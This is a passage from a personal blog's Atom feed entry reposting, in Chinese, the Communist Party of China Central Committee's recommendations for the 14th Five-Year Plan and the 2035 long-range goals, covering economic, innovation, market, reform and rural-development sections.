    <id>https://coder.lufer.cc/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86/%E4%B8%AD%E5%85%B1%E4%B8%AD%E5%A4%AE%E5%85%B3%E4%BA%8E%E5%88%B6%E5%AE%9A%E5%9B%BD%E6%B0%91%E7%BB%8F%E6%B5%8E%E5%92%8C%E7%A4%BE%E4%BC%9A%E5%8F%91%E5%B1%95%E7%AC%AC%E5%8D%81%E5%9B%9B%E4%B8%AA%E4%BA%94%E5%B9%B4%E8%A7%84%E5%88%92%E5%92%8C%E4%BA%8C%E3%80%87%E4%B8%89%E4%BA%94%E5%B9%B4%E8%BF%9C%E6%99%AF%E7%9B%AE%E6%A0%87%E7%9A%84%E5%BB%BA%E8%AE%AE/</id>
    <published>2020-12-28T07:39:07.000Z</published>
    <updated>2021-04-06T02:19:25.558Z</updated>
    
    <content type="html"><![CDATA[<p>  “十四五”时期是我国全面建成小康社会、实现第一个百年奋斗目标之后，乘势而上开启全面建设社会主义现代化国家新征程、向第二个百年奋斗目标进军的第一个五年。中国共产党第十九届中央委员会第五次全体会议深入分析国际国内形势，就制定国民经济和社会发展“十四五”规划和二〇三五年远景目标提出以下建议。</p><h1 id="一-全面建成小康社会开启全面建设社会主义现代化国家新征程"><a class="markdownIt-Anchor" href="#一-全面建成小康社会开启全面建设社会主义现代化国家新征程"></a> 一、全面建成小康社会，开启全面建设社会主义现代化国家新征程</h1><h2 id="1决胜全面建成小康社会取得决定性成就"><a class="markdownIt-Anchor" href="#1决胜全面建成小康社会取得决定性成就"></a> 1.决胜全面建成小康社会取得决定性成就</h2><p>  “十三五”时期是全面建成小康社会决胜阶段。面对错综复杂的国际形势、艰巨繁重的国内改革发展稳定任务特别是新冠肺炎疫情严重冲击，以习近平同志为核心的党中央不忘初心、牢记使命，团结带领全党全国各族人民砥砺前行、开拓创新，奋发有为推进党和国家各项事业。全面深化改革取得重大突破，全面依法治国取得重大进展，全面从严治党取得重大成果，国家治理体系和治理能力现代化加快推进，中国共产党领导和我国社会主义制度优势进一步彰显；经济实力、科技实力、综合国力跃上新的大台阶，经济运行总体平稳，经济结构持续优化，预计二〇二〇年<code>国内生产总值</code>突破一百万亿元；<code>脱贫攻坚</code>成果举世瞩目，五千五百七十五万农村贫困人口实现脱贫；<code>粮食年产量</code>连续五年稳定在一万三千亿斤以上；污染防治力度加大，<code>生态环境</code>明显改善；<code>对外开放</code>持续扩大，共建“一带一路”成果丰硕；人民生活水平显著提高，高等教育进入普及化阶段，城镇新增就业超过六千万人，建成世界上规模最大的<code>社会保障</code>体系，基本医疗保险覆盖超过十三亿人，基本养老保险覆盖近十亿人，新冠肺炎疫情防控取得重大战略成果；文化事业和文化产业繁荣发展；国防和军队建设水平大幅提升，军队组织形态实现重大变革；国家安全全面加强，社会保持和谐稳定。“十三五”规划目标任务即将完成，全面建成小康社会胜利在望，中华民族伟大复兴向前迈出了新的一大步，社会主义中国以更加雄伟的身姿屹立于世界东方。全党全国各族人民要再接再厉、一鼓作气，确保如期打赢脱贫攻坚战，确保如期全面建成小康社会、实现第一个百年奋斗目标，为开启全面建设社会主义现代化国家新征程奠定坚实基础。</p><h2 id="2我国发展环境面临深刻复杂变化"><a class="markdownIt-Anchor" href="#2我国发展环境面临深刻复杂变化"></a> 2.我国发展环境面临深刻复杂变化</h2><p>  当前和今后一个时期，我国发展仍然处于重要战略机遇期，但机遇和挑战都有新的发展变化。当今世界正经历百年未有之大变局，新一轮科技革命和产业变革深入发展，国际力量对比深刻调整，和平与发展仍然是时代主题，人类命运共同体理念深入人心，同时国际环境日趋复杂，不稳定性不确定性明显增加，新冠肺炎疫情影响广泛深远，经济全球化遭遇逆流，世界进入动荡变革期，单边主义、保护主义、霸权主义对世界和平与发展构成威胁。我国<code>已转向高质量发展阶段</code>，制度优势显著，治理效能提升，经济长期向好，物质基础雄厚，人力资源丰富，市场空间广阔，发展韧性强劲，社会大局稳定，继续发展具有多方面优势和条件，同时我国发展不平衡不充分问题仍然突出，重点领域关键环节改革任务仍然艰巨，<code>创新能力</code>不适应高质量发展要求，<code>农业基础</code>还不稳固，城乡区域<code>发展和收入分配差距</code>较大，生态环保任重道远，民生保障存在短板，社会治理还有弱项。全党要统筹中华民族伟大复兴战略全局和世界百年未有之大变局，深刻认识我国社会主要矛盾变化带来的新特征新要求，深刻认识错综复杂的国际环境带来的新矛盾新挑战，增强机遇意识和风险意识，立足社会主义初级阶段基本国情，保持战略定力，办好自己的事，认识和把握发展规律，发扬斗争精神，树立底线思维，准确识变、科学应变、主动求变，善于在危机中育先机、于变局中开新局，抓住机遇，应对挑战，趋利避害，奋勇前进。</p><h2 id="3到二〇三五年基本实现社会主义现代化远景目标"><a class="markdownIt-Anchor" href="#3到二〇三五年基本实现社会主义现代化远景目标"></a> 3.到二〇三五年基本实现社会主义现代化远景目标</h2><p>  党的十九大对实现第二个百年奋斗目标作出分两个阶段推进的战略安排，即<code>到二〇三五年基本实现社会主义现代化，到本世纪中叶把我国建成富强民主文明和谐美丽的社会主义现代化强国</code>。展望二〇三五年，我国经济实力、科技实力、综合国力将大幅跃升，经济总量和城乡居民人均收入将再迈上新的大台阶，关键核心技术实现重大突破，进入创新型国家前列；基本实现新型工业化、信息化、城镇化、农业现代化，建成现代化经济体系；基本实现国家治理体系和治理能力现代化，人民平等参与、平等发展权利得到充分保障，基本建成法治国家、法治政府、法治社会；建成文化强国、教育强国、人才强国、体育强国、健康中国，国民素质和社会文明程度达到新高度，国家文化软实力显著增强；广泛形成绿色生产生活方式，碳排放达峰后稳中有降，生态环境根本好转，美丽中国建设目标基本实现；形成对外开放新格局，参与国际经济合作和竞争新优势明显增强；人均国内生产总值达到中等发达国家水平，中等收入群体显著扩大，基本公共服务实现均等化，城乡区域发展差距和居民生活水平差距显著缩小；平安中国建设达到更高水平，基本实现国防和军队现代化；人民生活更加美好，人的全面发展、全体人民共同富裕取得更为明显的实质性进展。</p><h1 id="二-十四五时期经济社会发展指导方针和主要目标"><a class="markdownIt-Anchor" href="#二-十四五时期经济社会发展指导方针和主要目标"></a> 二、“十四五”时期经济社会发展指导方针和主要目标</h1><h2 id="4十四五时期经济社会发展指导思想"><a class="markdownIt-Anchor" href="#4十四五时期经济社会发展指导思想"></a> 4.“十四五”时期经济社会发展指导思想</h2><p>  高举中国特色社会主义伟大旗帜，深入贯彻党的十九大和十九届二中、三中、四中、五中全会精神，坚持以马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想为指导，全面贯彻党的基本理论、基本路线、基本方略，统筹推进经济建设、政治建设、文化建设、社会建设、生态文明建设的总体布局，协调推进全面建设社会主义现代化国家、全面深化改革、全面依法治国、全面从严治党的战略布局，坚定不移贯彻创新、协调、绿色、开放、共享的新发展理念，坚持稳中求进工作总基调，以推动高质量发展为主题，以深化供给侧结构性改革为主线，以改革创新为根本动力，以满足人民日益增长的美好生活需要为根本目的，统筹发展和安全，加快建设现代化经济体系，加快构建以国内大循环为主体、国内国际双循环相互促进的新发展格局，推进国家治理体系和治理能力现代化，实现经济行稳致远、社会安定和谐，为全面建设社会主义现代化国家开好局、起好步。</p><h2 id="5十四五时期经济社会发展必须遵循的原则"><a class="markdownIt-Anchor" href="#5十四五时期经济社会发展必须遵循的原则"></a> 5.“十四五”时期经济社会发展必须遵循的原则。</h2><h3 id="1-坚持党的全面领导"><a class="markdownIt-Anchor" href="#1-坚持党的全面领导"></a> 1、坚持党的全面领导</h3><p>  坚持和完善党领导经济社会发展的体制机制，坚持和完善中国特色社会主义制度，不断提高贯彻新发展理念、构建新发展格局能力和水平，为实现高质量发展提供根本保证。</p><h3 id="2-坚持以人民为中心"><a class="markdownIt-Anchor" href="#2-坚持以人民为中心"></a> 2、坚持以人民为中心</h3><p>  坚持人民主体地位，坚持共同富裕方向，始终做到发展为了人民、发展依靠人民、发展成果由人民共享，维护人民根本利益，激发全体人民积极性、主动性、创造性，促进社会公平，增进民生福祉，不断实现人民对美好生活的向往。</p><h3 id="3-坚持新发展理念"><a class="markdownIt-Anchor" href="#3-坚持新发展理念"></a> 3、坚持新发展理念</h3><p>  把新发展理念贯穿发展全过程和各领域，构建新发展格局，切实转变发展方式，推动质量变革、效率变革、动力变革，实现更高质量、更有效率、更加公平、更可持续、更为安全的发展。</p><h3 id="4-坚持深化改革开放"><a class="markdownIt-Anchor" href="#4-坚持深化改革开放"></a> 4、坚持深化改革开放</h3><p>  坚定不移推进改革，坚定不移扩大开放，加强国家治理体系和治理能力现代化建设，破除制约高质量发展、高品质生活的体制机制障碍，强化有利于提高资源配置效率、有利于调动全社会积极性的重大改革开放举措，持续增强发展动力和活力。</p><h3 id="5-坚持系统观念"><a class="markdownIt-Anchor" href="#5-坚持系统观念"></a> 5、坚持系统观念</h3><p>  加强前瞻性思考、全局性谋划、战略性布局、整体性推进，统筹国内国际两个大局，办好发展安全两件大事，坚持全国一盘棋，更好发挥中央、地方和各方面积极性，着力固根基、扬优势、补短板、强弱项，注重防范化解重大风险挑战，实现发展质量、结构、规模、速度、效益、安全相统一。</p><h2 id="6十四五时期经济社会发展主要目标"><a class="markdownIt-Anchor" href="#6十四五时期经济社会发展主要目标"></a> 6.“十四五”时期经济社会发展主要目标</h2><p>  锚定二〇三五年远景目标，综合考虑国内外发展趋势和我国发展条件，坚持目标导向和问题导向相结合，坚持守正和创新相统一，今后五年经济社会发展要努力实现以下主要目标。</p><h3 id="1-经济发展取得新成效"><a class="markdownIt-Anchor" href="#1-经济发展取得新成效"></a> 1、经济发展取得新成效</h3><p>  发展是解决我国一切问题的基础和关键，发展必须坚持新发展理念，在质量效益明显提升的基础上实现经济持续健康发展，增长潜力充分发挥，国内市场更加强大，经济结构更加优化，创新能力显著提升，产业基础高级化、产业链现代化水平明显提高，农业基础更加稳固，城乡区域发展协调性明显增强，现代化经济体系建设取得重大进展。</p><h3 id="2-改革开放迈出新步伐"><a class="markdownIt-Anchor" href="#2-改革开放迈出新步伐"></a> 2、改革开放迈出新步伐</h3><p>  社会主义市场经济体制更加完善，高标准市场体系基本建成，市场主体更加充满活力，产权制度改革和要素市场化配置改革取得重大进展，公平竞争制度更加健全，更高水平开放型经济新体制基本形成。</p><h3 id="3-社会文明程度得到新提高"><a class="markdownIt-Anchor" href="#3-社会文明程度得到新提高"></a> 3、社会文明程度得到新提高</h3><p>  社会主义核心价值观深入人心，人民思想道德素质、科学文化素质和身心健康素质明显提高，公共文化服务体系和文化产业体系更加健全，人民精神文化生活日益丰富，中华文化影响力进一步提升，中华民族凝聚力进一步增强。</p><h3 id="4-生态文明建设实现新进步"><a class="markdownIt-Anchor" href="#4-生态文明建设实现新进步"></a> 4、生态文明建设实现新进步</h3><p>  国土空间开发保护格局得到优化，生产生活方式绿色转型成效显著，能源资源配置更加合理、利用效率大幅提高，主要污染物排放总量持续减少，生态环境持续改善，生态安全屏障更加牢固，城乡人居环境明显改善。</p><h3 id="5-民生福祉达到新水平"><a class="markdownIt-Anchor" href="#5-民生福祉达到新水平"></a> 5、民生福祉达到新水平</h3><p>  实现更加充分更高质量就业，居民收入增长和经济增长基本同步，分配结构明显改善，基本公共服务均等化水平明显提高，全民受教育程度不断提升，多层次社会保障体系更加健全，卫生健康体系更加完善，脱贫攻坚成果巩固拓展，乡村振兴战略全面推进。</p><h3 id="6-国家治理效能得到新提升"><a class="markdownIt-Anchor" href="#6-国家治理效能得到新提升"></a> 6、国家治理效能得到新提升</h3><p>  社会主义民主法治更加健全，社会公平正义进一步彰显，国家行政体系更加完善，政府作用更好发挥，行政效率和公信力显著提升，社会治理特别是基层治理水平明显提高，防范化解重大风险体制机制不断健全，突发公共事件应急能力显著增强，自然灾害防御水平明显提升，发展安全保障更加有力，国防和军队现代化迈出重大步伐。</p><h1 id="三-坚持创新驱动发展全面塑造发展新优势"><a class="markdownIt-Anchor" href="#三-坚持创新驱动发展全面塑造发展新优势"></a> 三、坚持创新驱动发展，全面塑造发展新优势</h1><p>  坚持创新在我国现代化建设全局中的核心地位，把科技自立自强作为国家发展的战略支撑，面向世界科技前沿、面向经济主战场、面向国家重大需求、面向人民生命健康，深入实施科教兴国战略、人才强国战略、创新驱动发展战略，完善国家创新体系，加快建设科技强国。</p><h2 id="7强化国家战略科技力量"><a class="markdownIt-Anchor" href="#7强化国家战略科技力量"></a> 7.强化国家战略科技力量</h2><p>  制定科技强国行动纲要，健全社会主义市场经济条件下新型举国体制，打好关键核心技术攻坚战，提高创新链整体效能。加强基础研究、注重原始创新，优化学科布局和研发布局，推进学科交叉融合，完善共性基础技术供给体系。瞄准人工智能、量子信息、集成电路、生命健康、脑科学、生物育种、空天科技、深地深海等前沿领域，实施一批具有前瞻性、战略性的国家重大科技项目。制定实施战略性科学计划和科学工程，推进科研院所、高校、企业科研力量优化配置和资源共享。推进国家实验室建设，重组国家重点实验室体系。布局建设综合性国家科学中心和区域性创新高地，支持北京、上海、粤港澳大湾区形成国际科技创新中心。构建国家科研论文和科技信息高端交流平台。</p><h2 id="8提升企业技术创新能力"><a class="markdownIt-Anchor" href="#8提升企业技术创新能力"></a> 8.提升企业技术创新能力</h2><p>  强化企业创新主体地位，促进各类创新要素向企业集聚。推进<code>产学研深度融合</code>，支持企业牵头组建创新联合体，承担国家重大科技项目。发挥企业家在技术创新中的重要作用，鼓励企业加大研发投入，对企业投入基础研究实行税收优惠。发挥大企业引领支撑作用，支持创新型中小微企业成长为创新重要发源地，加强共性技术平台建设，推动产业链上中下游、大中小企业融通创新。</p><h2 id="9激发人才创新活力"><a class="markdownIt-Anchor" href="#9激发人才创新活力"></a> 9.激发人才创新活力</h2><p>  贯彻尊重劳动、尊重知识、尊重人才、尊重创造方针，深化人才发展体制机制改革，全方位培养、引进、用好人才，造就更多国际一流的科技领军人才和创新团队，培养具有国际竞争力的青年科技人才后备军。健全以创新能力、质量、实效、贡献为导向的科技人才评价体系。加强学风建设，坚守学术诚信。深化院士制度改革。健全创新激励和保障机制，构建充分体现知识、技术等创新要素价值的收益分配机制，完善科研人员职务发明成果权益分享机制。加强创新型、应用型、技能型人才培养，实施知识更新工程、技能提升行动，壮大高水平工程师和高技能人才队伍。支持发展高水平研究型大学，加强基础研究人才培养。实行更加开放的人才政策，构筑集聚国内外优秀人才的科研创新高地。</p><h2 id="10完善科技创新体制机制"><a class="markdownIt-Anchor" href="#10完善科技创新体制机制"></a> 10.完善科技创新体制机制</h2><p>  深入推进科技体制改革，完善国家科技治理体系，优化国家科技规划体系和运行机制，推动重点领域项目、基地、人才、资金一体化配置。改进科技项目组织管理方式，实行“揭榜挂帅”等制度。完善科技评价机制，优化科技奖励项目。加快科研院所改革，扩大科研自主权。加强知识产权保护，大幅提高科技成果转移转化成效。加大研发投入，健全政府投入为主、社会多渠道投入机制，加大对基础前沿研究支持。完善金融支持创新体系，促进新技术产业化规模化应用。弘扬科学精神和工匠精神，加强科普工作，营造崇尚创新的社会氛围。健全科技伦理体系。促进科技开放合作，研究设立面向全球的科学研究基金。</p><h1 id="四-加快发展现代产业体系推动经济体系优化升级"><a class="markdownIt-Anchor" href="#四-加快发展现代产业体系推动经济体系优化升级"></a> 四、加快发展现代产业体系，推动经济体系优化升级</h1><p>  坚持把发展经济着力点放在实体经济上，坚定不移建设制造强国、质量强国、网络强国、数字中国，推进产业基础高级化、产业链现代化，提高经济质量效益和核心竞争力。</p><h2 id="11提升产业链供应链现代化水平"><a class="markdownIt-Anchor" href="#11提升产业链供应链现代化水平"></a> 11.提升产业链供应链现代化水平</h2><p>  保持制造业比重基本稳定，巩固壮大实体经济根基。坚持自主可控、安全高效，分行业做好供应链战略设计和精准施策，推动全产业链优化升级。锻造产业链供应链长板，立足我国产业规模优势、配套优势和部分领域先发优势，打造新兴产业链，推动传统产业高端化、智能化、绿色化，发展服务型制造。完善国家质量基础设施，加强标准、计量、专利等体系和能力建设，深入开展质量提升行动。促进产业在国内有序转移，优化区域产业链布局，支持老工业基地转型发展。补齐产业链供应链短板，实施产业基础再造工程，加大重要产品和关键核心技术攻关力度，发展先进适用技术，推动产业链供应链多元化。优化产业链供应链发展环境，强化要素支撑。加强国际产业安全合作，形成具有更强创新力、更高附加值、更安全可靠的产业链供应链。</p><h2 id="12发展战略性新兴产业"><a class="markdownIt-Anchor" href="#12发展战略性新兴产业"></a> 12.发展战略性新兴产业</h2><p>  加快壮大新一代信息技术、生物技术、新能源、新材料、高端装备、新能源汽车、绿色环保以及航空航天、海洋装备等产业。推动<code>互联网</code>、<code>大数据</code>、<code>人工智能</code>等同各产业深度融合，推动先进制造业集群发展，构建一批各具特色、优势互补、结构合理的战略性新兴产业增长引擎，培育新技术、新产品、新业态、新模式。促进平台经济、共享经济健康发展。鼓励企业兼并重组，防止低水平重复建设。</p><h2 id="13加快发展现代服务业"><a class="markdownIt-Anchor" href="#13加快发展现代服务业"></a> 13.加快发展现代服务业</h2><p>  推动生产性服务业向专业化和价值链高端延伸，推动各类市场主体参与服务供给，加快发展研发设计、<code>现代物流</code>、法律服务等服务业，推动现代服务业同先进制造业、<code>现代农业</code>深度融合，加快推进服务业数字化。推动生活性服务业向高品质和多样化升级，加快发展健康、养老、育幼、文化、旅游、体育、家政、物业等服务业，加强公益性、基础性服务业供给。推进服务业标准化、品牌化建设。</p><h2 id="14统筹推进基础设施建设"><a class="markdownIt-Anchor" href="#14统筹推进基础设施建设"></a> 14.统筹推进基础设施建设</h2><p>  构建系统完备、高效实用、智能绿色、安全可靠的现代化基础设施体系。系统布局新型基础设施，加快第五代移动通信、工业互联网、大数据中心等建设。加快建设交通强国，完善综合运输大通道、综合交通枢纽和物流网络，加快城市群和都市圈轨道交通网络化，提高农村和边境地区交通通达深度。推进能源革命，完善能源产供储销体系，加强国内油气勘探开发，加快油气储备设施建设，加快全国干线油气管道建设，建设智慧能源系统，优化电力生产和输送通道布局，提升新能源消纳和存储能力，提升向边远地区输配电能力。加强水利基础设施建设，提升水资源优化配置和水旱灾害防御能力。</p><h2 id="15加快数字化发展"><a class="markdownIt-Anchor" href="#15加快数字化发展"></a> 15.加快数字化发展</h2><p>  发展<code>数字经济</code>，推进数字产业化和产业数字化，推动数字经济和实体经济深度融合，打造具有国际竞争力的数字产业集群。加强数字社会、数字政府建设，提升公共服务、社会治理等数字化智能化水平。建立数据资源产权、交易流通、跨境传输和安全保护等基础制度和标准规范，推动数据资源开发利用。扩大基础公共信息数据有序开放，<code>建设国家数据统一共享开放平台</code>。保障国家数据安全，加强个人信息保护。提升全民数字技能，实现信息服务全覆盖。积极参与数字领域国际规则和标准制定。</p><h1 id="五-形成强大国内市场构建新发展格局"><a class="markdownIt-Anchor" href="#五-形成强大国内市场构建新发展格局"></a> 五、形成强大国内市场，构建新发展格局</h1><p>  坚持扩大内需这个战略基点，加快培育完整内需体系，把实施扩大内需战略同深化供给侧结构性改革有机结合起来，以创新驱动、高质量供给引领和创造新需求。</p><h2 id="16畅通国内大循环"><a class="markdownIt-Anchor" href="#16畅通国内大循环"></a> 16.畅通国内大循环</h2><p>  依托强大国内市场，贯通生产、分配、流通、消费各环节，打破行业垄断和地方保护，形成国民经济良性循环。优化供给结构，改善供给质量，提升供给体系对国内需求的适配性。推动金融、房地产同实体经济均衡发展，实现上下游、产供销有效衔接，促进农业、制造业、服务业、能源资源等产业门类关系协调。破除妨碍生产要素市场化配置和商品服务流通的体制机制障碍，降低全社会交易成本。完善扩大内需的政策支撑体系，形成需求牵引供给、供给创造需求的更高水平动态平衡。</p><h2 id="17促进国内国际双循环"><a class="markdownIt-Anchor" href="#17促进国内国际双循环"></a> 17.促进国内国际双循环</h2><p>  立足国内大循环，发挥比较优势，协同推进强大国内市场和贸易强国建设，以国内大循环吸引全球资源要素，充分利用国内国际两个市场两种资源，积极促进内需和外需、进口和出口、引进外资和对外投资协调发展，促进国际收支基本平衡。完善内外贸一体化调控体系，促进内外贸法律法规、监管体制、经营资质、质量标准、检验检疫、认证认可等相衔接，推进同线同标同质。优化国内国际市场布局、商品结构、贸易方式，提升出口质量，增加优质产品进口，实施贸易投资融合工程，构建现代物流体系。</p><h2 id="18全面促进消费"><a class="markdownIt-Anchor" href="#18全面促进消费"></a> 18.全面促进消费</h2><p>  增强消费对经济发展的基础性作用，顺应消费升级趋势，提升传统消费，培育新型消费，适当增加公共消费。以质量品牌为重点，促进消费向绿色、健康、安全发展，鼓励消费新模式新业态发展。推动汽车等消费品由购买管理向使用管理转变，促进住房消费健康发展。健全现代流通体系，发展无接触交易服务，降低企业流通成本，促进线上线下消费融合发展，开拓城乡消费市场。发展服务消费，放宽服务消费领域市场准入。完善节假日制度，落实带薪休假制度，扩大节假日消费。培育国际消费中心城市。改善消费环境，强化消费者权益保护。</p><h2 id="19拓展投资空间"><a class="markdownIt-Anchor" href="#19拓展投资空间"></a> 19.拓展投资空间</h2><p>  优化投资结构，保持投资合理增长，发挥投资对优化供给结构的关键作用。加快补齐<code>基础设施、市政工程、农业农村、公共安全、生态环保、公共卫生、物资储备、防灾减灾、民生保障</code>等领域短板，推动企业设备更新和技术改造，扩大战略性新兴产业投资。推进新型基础设施、新型城镇化、交通水利等重大工程建设，支持有利于城乡区域协调发展的重大项目建设。实施川藏铁路、西部陆海新通道、国家水网、雅鲁藏布江下游水电开发、星际探测、北斗产业化等重大工程，推进重大科研设施、重大生态系统保护修复、公共卫生应急保障、重大引调水、防洪减灾、送电输气、沿边沿江沿海交通等一批强基础、增功能、利长远的重大项目建设。发挥政府投资撬动作用，激发民间投资活力，形成市场主导的投资内生增长机制。</p><h1 id="六-全面深化改革构建高水平社会主义市场经济体制"><a class="markdownIt-Anchor" href="#六-全面深化改革构建高水平社会主义市场经济体制"></a> 六、全面深化改革，构建高水平社会主义市场经济体制</h1><p>  坚持和完善社会主义基本经济制度，充分发挥市场在资源配置中的决定性作用，更好发挥政府作用，推动有效市场和有为政府更好结合。</p><h2 id="20激发各类市场主体活力"><a class="markdownIt-Anchor" href="#20激发各类市场主体活力"></a> 20.激发各类市场主体活力</h2><p>  毫不动摇巩固和发展公有制经济，毫不动摇鼓励、支持、引导非公有制经济发展。深化国资国企改革，做强做优做大国有资本和国有企业。加快国有经济布局优化和结构调整，发挥国有经济战略支撑作用。加快完善中国特色现代企业制度，深化国有企业混合所有制改革。健全管资本为主的国有资产监管体制，深化国有资本投资、运营公司改革。<code>推进能源、铁路、电信、公用事业</code>等行业竞争性环节市场化改革。优化民营经济发展环境，构建亲清政商关系，促进非公有制经济健康发展和非公有制经济人士健康成长，依法平等保护民营企业产权和企业家权益，破除制约民营企业发展的各种壁垒，完善促进中小微企业和个体工商户发展的法律环境和政策体系。弘扬企业家精神，加快建设世界一流企业。</p><h2 id="21完善宏观经济治理"><a class="markdownIt-Anchor" href="#21完善宏观经济治理"></a> 21.完善宏观经济治理</h2><p>  健全以国家发展规划为战略导向，以财政政策和货币政策为主要手段，就业、产业、投资、消费、环保、区域等政策紧密配合，目标优化、分工合理、高效协同的宏观经济治理体系。完善宏观经济政策制定和执行机制，重视预期管理，提高调控的科学性。加强国际宏观经济政策协调，搞好跨周期政策设计，提高逆周期调节能力，促进经济总量平衡、结构优化、内外均衡。加强宏观经济治理数据库等建设，提升大数据等现代技术手段辅助治理能力。推进统计现代化改革。</p><h2 id="22建立现代财税金融体制"><a class="markdownIt-Anchor" href="#22建立现代财税金融体制"></a> 22.建立现代财税金融体制</h2><p>  加强财政资源统筹，加强中期财政规划管理，增强国家重大战略任务财力保障。深化预算管理制度改革，强化对预算编制的宏观指导。推进财政支出标准化，强化预算约束和绩效管理。明确中央和地方政府事权与支出责任，健全省以下财政体制，增强基层公共服务保障能力。完善现代税收制度，健全地方税、直接税体系，优化税制结构，适当提高直接税比重，深化税收征管制度改革。健全政府债务管理制度。建设现代中央银行制度，完善货币供应调控机制，稳妥推进数字货币研发，健全市场化利率形成和传导机制。构建金融有效支持实体经济的体制机制，提升金融科技水平，增强金融普惠性。深化国有商业银行改革，支持中小银行和农村信用社持续健康发展，改革优化政策性金融。全面实行股票发行注册制，建立常态化退市机制，提高直接融资比重。推进金融双向开放。完善现代金融监管体系，提高金融监管透明度和法治化水平，完善存款保险制度，健全金融风险预防、预警、处置、问责制度体系，对违法违规行为零容忍。</p><h2 id="23建设高标准市场体系"><a class="markdownIt-Anchor" href="#23建设高标准市场体系"></a> 23.建设高标准市场体系</h2><p>  健全市场体系基础制度，坚持平等准入、公正监管、开放有序、诚信守法，形成高效规范、公平竞争的国内统一市场。实施高标准市场体系建设行动。健全产权执法司法保护制度。实施统一的市场准入负面清单制度。继续放宽准入限制。健全公平竞争审查机制，加强反垄断和反不正当竞争执法司法，提升市场综合监管能力。深化土地管理制度改革。推进土地、劳动力、资本、技术、数据等要素市场化改革。健全要素市场运行机制，完善要素交易规则和服务体系。</p><h2 id="24加快转变政府职能"><a class="markdownIt-Anchor" href="#24加快转变政府职能"></a> 24.加快转变政府职能</h2><p>  建设职责明确、依法行政的政府治理体系。深化简政放权、放管结合、优化服务改革，全面实行政府权责清单制度。持续优化市场化法治化国际化营商环境。实施涉企经营许可事项清单管理，加强事中事后监管，对新产业新业态实行包容审慎监管。健全重大政策事前评估和事后评价制度，畅通参与政策制定的渠道，提高决策科学化、民主化、法治化水平。推进政务服务标准化、规范化、便利化，深化政务公开。深化行业协会、商会和中介机构改革。</p><h1 id="七-优先发展农业农村全面推进乡村振兴"><a class="markdownIt-Anchor" href="#七-优先发展农业农村全面推进乡村振兴"></a> 七、优先发展农业农村，全面推进乡村振兴</h1><p>  坚持把解决好“三农”问题作为全党工作重中之重，走中国特色社会主义乡村振兴道路，全面实施乡村振兴战略，强化以工补农、以城带乡，推动形成工农互促、城乡互补、协调发展、共同繁荣的新型工农城乡关系，加快农业农村现代化。</p><h2 id="25提高农业质量效益和竞争力"><a class="markdownIt-Anchor" href="#25提高农业质量效益和竞争力"></a> 25.提高农业质量效益和竞争力</h2><p>  适应确保国计民生要求，以保障国家粮食安全为底线，健全农业支持保护制度。坚持最严格的耕地保护制度，深入实施<code>藏粮于地、藏粮于技</code>战略，加大农业水利设施建设力度，实施高标准农田建设工程，强化农业科技和装备支撑，提高农业良种化水平，健全动物防疫和农作物病虫害防治体系，建设智慧农业。强化绿色导向、标准引领和质量安全监管，建设农业现代化示范区。推动农业供给侧结构性改革，优化农业生产结构和区域布局，加强粮食生产功能区、重要农产品生产保护区和特色农产品优势区建设，推进优质粮食工程。完善粮食主产区利益补偿机制。保障粮、棉、油、糖、肉等重要农产品供给安全，提升收储调控能力。开展粮食节约行动。发展县域经济，推动农村一二三产业融合发展，丰富乡村经济业态，拓展农民增收空间。</p><h2 id="26实施乡村建设行动"><a class="markdownIt-Anchor" href="#26实施乡村建设行动"></a> 26.实施乡村建设行动</h2><p>  把乡村建设摆在社会主义现代化建设的重要位置。强化县城综合服务能力，把乡镇建成服务农民的区域中心。统筹县域城镇和村庄规划建设，保护传统村落和乡村风貌。完善乡村水、电、路、气、通信、广播电视、物流等基础设施，提升农房建设质量。因地制宜推进农村改厕、生活垃圾处理和污水治理，实施河湖水系综合整治，改善农村人居环境。提高农民科技文化素质，推动乡村人才振兴。</p><h2 id="27深化农村改革"><a class="markdownIt-Anchor" href="#27深化农村改革"></a> 27.深化农村改革</h2><p>  健全城乡融合发展机制，推动城乡要素平等交换、双向流动，增强农业农村发展活力。落实第二轮土地承包到期后再延长三十年政策，加快培育农民合作社、家庭农场等新型农业经营主体，健全农业专业化社会化服务体系，发展多种形式适度规模经营，实现小农户和现代农业有机衔接。健全城乡统一的建设用地市场，积极探索实施农村集体经营性建设用地入市制度。建立土地征收公共利益用地认定机制，缩小土地征收范围。探索宅基地所有权、资格权、使用权分置实现形式。保障进城落户农民土地承包权、宅基地使用权、集体收益分配权，鼓励依法自愿有偿转让。深化农村集体产权制度改革，发展新型农村集体经济。健全农村金融服务体系，发展农业保险。</p><h2 id="28实现巩固拓展脱贫攻坚成果同乡村振兴有效衔接"><a class="markdownIt-Anchor" href="#28实现巩固拓展脱贫攻坚成果同乡村振兴有效衔接"></a> 28.实现巩固拓展脱贫攻坚成果同乡村振兴有效衔接</h2><p>  建立农村低收入人口和欠发达地区帮扶机制，保持财政投入力度总体稳定，接续推进脱贫地区发展。健全防止返贫监测和帮扶机制，做好易地扶贫搬迁后续帮扶工作，加强扶贫项目资金资产管理和监督，推动特色产业可持续发展。健全农村社会保障和救助制度。在西部地区脱贫县中集中支持一批乡村振兴重点帮扶县，增强其巩固脱贫成果及内生发展能力。坚持和完善东西部协作和对口支援、社会力量参与帮扶等机制。</p><h1 id="八-优化国土空间布局推进区域协调发展和新型城镇化"><a class="markdownIt-Anchor" href="#八-优化国土空间布局推进区域协调发展和新型城镇化"></a> 八、优化国土空间布局，推进区域协调发展和新型城镇化</h1><p>  坚持实施<code>区域重大</code>战略、<code>区域协调发展</code>战略、<code>主体功能区</code>战略，健全区域协调发展体制机制，完善新型城镇化战略，构建高质量发展的国土空间布局和支撑体系。</p><h2 id="29构建国土空间开发保护新格局"><a class="markdownIt-Anchor" href="#29构建国土空间开发保护新格局"></a> 29.构建国土空间开发保护新格局</h2><p>  立足资源环境承载能力，发挥各地比较优势，逐步形成<code>城市化地区</code>、<code>农产品主产区</code>、<code>生态功能区</code>三大空间格局，优化重大基础设施、重大生产力和公共资源布局。支持城市化地区高效集聚经济和人口、保护基本农田和生态空间，支持农产品主产区增强农业生产能力，支持生态功能区把发展重点放到保护生态环境、提供生态产品上，支持生态功能区的人口逐步有序转移，形成主体功能明显、优势互补、高质量发展的国土空间开发保护新格局。</p><h2 id="30推动区域协调发展"><a class="markdownIt-Anchor" href="#30推动区域协调发展"></a> 30.推动区域协调发展</h2><p>  